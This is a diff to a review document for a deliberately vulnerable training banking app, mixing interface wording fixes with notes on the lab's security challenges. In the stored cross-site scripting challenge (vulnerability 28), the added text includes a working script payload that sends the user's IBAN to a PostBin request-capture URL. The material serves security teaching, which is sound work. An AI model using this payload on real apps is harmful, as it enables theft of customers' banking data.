@@ -8,9 +8,12 @@ The vulnerabilites are rated as *easy*, *medium* and *hard*, giving an indicatio
 
 ### General issues
 
-In the menu and on the home screen, use "Payments" (not Payment and "Investments" (not Investment).
+Investments: The text "Manage your investments!" can be removed.
 
-On the Investments screen, use "Investments" in the title.
+Investments: "Amount:" should be "Amount".
+
+Meta Settings: Save Button is under the Reste App button.
+
 Use "Meta Settings" instead of "Meta-Settings" in the menu and at the very top of the corresponding screen. And also use this everywehere else where there is currently "Meta-Settings" or "Metasettings".
 
 Make sure to adapt the text in "About App". And also the screenshot. => Marc will do this
@@ -240,9 +243,19 @@ Just like with investments (see vulnerability 25), a local database is also used
 **Check**: Could not test as I couldn't build SQLCipher
 
 ### 28: WebView Cross-Site Scripting (medium)
-The DIBA app pwovides a survey to banking customers so they can provide some feedback. This survey is implemented using a WebView and contains a Cross-Site Scripting (XSS) vulnerability. As a result of this...
+The DIBA app provides a survey to banking customers so they can provide some feedback. This survey is implemented using a WebView that contains a stored Cross-Site Scripting (XSS) vulnerability.
 
-Couldn't do this one. How can I access the survey at any time? And: Often, the survey crashes when it is accessed
+**Goal:** Exploit the vulnerability so that whenever a user opens the survey screen, his IBAN (which is included at the top of the screen) is sent in a request to a host controlled by the attacker.
+
+**Hint:** An easy way to capture request is by using [PostBin](https://postb.in).
+
+**Check**: Works
+
+Note: I only could do string concatenation with the concat method, but not with "+":
+
+new Image().src = encodeURI("https://postb.in/1589184632761-8206421809736?iban=".concat(document.getElementById('iban').text));
+</script>
+
 
 ### 29: Cracking Weak Password
 
